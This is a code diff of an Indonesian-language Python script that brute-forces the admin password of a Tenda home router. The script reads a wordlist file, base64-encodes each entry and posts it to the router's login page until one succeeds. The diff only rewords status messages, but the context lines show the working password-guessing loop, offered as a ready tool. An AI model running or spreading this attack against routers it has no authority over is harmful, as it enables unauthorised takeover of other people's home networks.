@@ -2,17 +2,17 @@ try:
     import os,sys,requests,base64
     from bs4 import BeautifulSoup
 except ModuleNotFoundError:
-    print(f"modul requests belum terinstall, jalankan :\n› \033[36mpip install requests\033[0m")
+    print(f"ada modul yang belum terinstal, cek :\n› \033[36mnano router.py\033[0m")
 
-os.system("cls" if os.name == "nt" else "clear");print("Router : Tenda ⛺\nAlamat : 192.168.0.1/login.asp\n")
+os.system("cls" if os.name == "nt" else "clear");print("Router : Tenda ⛺\nRedirect : 192.168.0.1/login.asp\n")
 def encode_password(password):
     return base64.b64encode(password.encode('utf-8')).decode('utf-8')
 def deteksi_nama_router(session):
     try:
         response = session.get("http://192.168.0.1", timeout=5)
     except requests.exceptions.Timeout:
-        print("[\033[1m\033[33m*\033[0m] Permintaan mendeteksi router habis!")
-        return "Router tidak terdeteksi"
+        print("[\033[1m\033[33m*\033[0m] Timeout!")
+        return "Router tak terdeteksi"
 
     if "TP-LINK" in response.text:
         return "TP-LINK"
@@ -52,7 +52,7 @@ try:
     with open(lokasi_file, 'r') as file:
         passwords = file.read().splitlines()
 except FileNotFoundError:
-    print(f"[\033[1m\033[31m*\033[0m] File '{lokasi_file}' tidak ditemukan!")
+    print(f"[\033[1m\033[31m*\033[0m] File '{lokasi_file}' tak ditemukan!")
     exit(1)
 
 headers = {
@@ -74,7 +74,7 @@ for password in passwords:
     try:
         response = session.post(url, data=data, headers=headers, timeout=5)
     except requests.exceptions.Timeout:
-        print(f"[\033[1m\033[31m*\033[0m] Permintaan login password '{password}' waktu habis!")
+        print(f"[\033[1m\033[31m*\033[0m] Timeout '{password}'")
         continue
     except KeyboardInterrupt:
         pass
@@ -87,4 +87,4 @@ for password in passwords:
         print(f"\n[\033[1m\033[33m*\033[0m] \033[32mLogin berhasil! Password : {password}")
         break
 else:
-    print("\n[\033[1m\033[31m!\033[0m] Semua password sudah kucoba, tidak ada yang berhasil.")
+    print("\n[\033[1m\033[31m!\033[0m] Semua password sudah dicoba, tidak ada yang berhasil.")
